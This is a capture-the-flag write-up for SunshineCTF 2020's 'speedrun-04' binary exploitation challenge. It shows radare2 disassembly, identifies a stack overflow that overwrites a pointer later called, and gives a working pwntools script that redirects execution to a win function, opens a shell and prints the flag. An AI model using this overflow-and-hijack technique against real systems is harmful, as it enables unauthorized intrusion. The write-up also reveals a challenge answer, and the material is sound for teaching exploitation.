# speedrun-04

## Task

nc chal.2020.sunshinectf.org 30004

File: chall_04

Tags: binary exploitation

## Solution

We now have this binary:

```nasm
[0x004004d0]> afl
0x004004d0    1 42           entry0
0x00400510    4 42   -> 37   sym.deregister_tm_clones
0x00400540    4 58   -> 55   sym.register_tm_clones
0x00400580    3 34   -> 29   sym.__do_global_dtors_aux
0x004005b0    1 7            entry.init0
0x004006a0    1 2            sym.__libc_csu_fini
0x004005ca    1 49           sym.vuln
0x004004c0    1 6            sym.imp.fgets
0x004006a4    1 9            sym._fini
0x00400630    4 101          sym.__libc_csu_init
0x004005b7    1 19           sym.win
0x004004b0    1 6            sym.imp.system
0x00400500    1 2            sym._dl_relocate_static_pie
0x004005fb    1 52           main
0x004004a0    1 6            sym.imp.puts
0x00400478    3 23           sym._init
[0x004004d0]> pdf@main
            ; DATA XREF from entry0 @ 0x4004ed
┌ 52: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x20
│           0x004005fb      55             push rbp
│           0x004005fc      4889e5         mov rbp, rsp
│           0x004005ff      4883ec20       sub rsp, 0x20
│           0x00400603      488d3db60000.  lea rdi, str.Like_some_kind_of_madness__was_taking_control. ; 0x4006c0 ; "Like some kind of madness, was taking control." ; const char *s
│           0x0040060a      e891feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040060f      488b152a0a20.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x601040:8]=0 ; FILE *stream
│           0x00400616      488d45e0       lea rax, [s]
│           0x0040061a      be13000000     mov esi, 0x13               ; 19 ; int size
│           0x0040061f      4889c7         mov rdi, rax                ; char *s
│           0x00400622      e899feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x00400627      e89effffff     call sym.vuln
│           0x0040062c      90             nop
│           0x0040062d      c9             leave
└           0x0040062e      c3             ret
[0x004004d0]> pdf@sym.vuln
            ; CALL XREF from main @ 0x400627
┌ 49: sym.vuln ();
│           ; var char *s @ rbp-0x40
│           ; var int64_t var_8h @ rbp-0x8
│           0x004005ca      55             push rbp
│           0x004005cb      4889e5         mov rbp, rsp
│           0x004005ce      4881ec400200.  sub rsp, 0x240
│           0x004005d5      488b15640a20.  mov rdx, qword [obj.stdin]  ; obj.__TMC_END
│                                                                      ; [0x601040:8]=0 ; FILE *stream
│           0x004005dc      488d45c0       lea rax, [s]
│           0x004005e0      be64000000     mov esi, 0x64               ; 'd' ; 100 ; int size
│           0x004005e5      4889c7         mov rdi, rax                ; char *s
│           0x004005e8      e8d3feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x004005ed      488b55f8       mov rdx, qword [var_8h]
│           0x004005f1      b800000000     mov eax, 0
│           0x004005f6      ffd2           call rdx
│           0x004005f8      90             nop
│           0x004005f9      c9             leave
└           0x004005fa      c3             ret
```

We see a `call rdx` in `sym.vuln`. We use `pattern` with gdb peda and find the offset for that location: `74`.

Now we write our script:

```python
from pwn import *

p = remote("chal.2020.sunshinectf.org", 30004)
#p = process("./chall_04")

payload  = "A"*74
payload += p64(0x004005b7)

p.sendline(payload)
p.interactive()
```

And get our shell:

```bash
$ python2 pwny.py
[+] Opening connection to chal.2020.sunshinectf.org on port 30004: Done
[*] Switching to interactive mode
Like some kind of madness, was taking control.
$ ls
chall_04
flag.txt
$ cat flag.txt
sun{critical-acclaim-96cfde3d068e77bf}
```
